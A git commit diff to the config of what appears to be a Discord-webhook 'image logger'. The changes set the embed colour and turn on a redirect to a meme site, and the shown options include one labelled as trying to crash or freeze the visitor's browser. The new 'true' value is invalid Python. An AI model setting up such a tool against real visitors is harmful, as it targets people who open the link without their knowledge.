7383d1d4393b31bd61e75057b9f6853fa0446cd4
fishyramen <128990874+fishyramen@users.noreply.github.com>
2026-01-22 22:25:28 -0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -19,7 +19,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "snatch blue", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x29FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": true, # Redirect to a webpage?
+        "page": "https://bigrat.monster/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
